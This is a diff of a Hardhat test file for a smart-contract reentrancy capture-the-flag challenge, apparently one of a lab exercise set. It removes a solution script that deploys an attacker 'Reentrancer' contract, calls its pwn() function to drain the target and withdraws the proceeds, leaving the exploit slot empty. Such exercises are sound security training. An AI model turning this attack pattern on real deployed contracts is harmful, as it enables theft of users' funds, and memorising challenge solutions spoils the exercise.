@@ -29,18 +29,7 @@ describe('[Challenge] Reentrance', function () {
 
     it('Exploit', async () => {
         /** CODE YOUR EXPLOIT HERE */
-        console.log(`\t attacker balance: ${ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address))}`);
-        console.log(`\t deploying reentrancer contract...`);
-        const ReentrancerFactory = await ethers.getContractFactory('Reentrancer', attacker);
-        const Reentrancer = await ReentrancerFactory.deploy(
-            this.target.address,
-            {value: ethers.utils.parseEther("0.05", "ether")}
-        );
-        console.log(`\t pwning...`);
-        let pwnTX = await Reentrancer.connect(attacker).pwn(); await pwnTX.wait();
-        console.log(`\t withdrawing...`);
-        let withdrawTX = await Reentrancer.connect(attacker).withdraw(); await withdrawTX.wait();
-        console.log(`\t attacker balance: ${ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address))}`);
+        
     }).timeout(0);
 
     after(async () => {
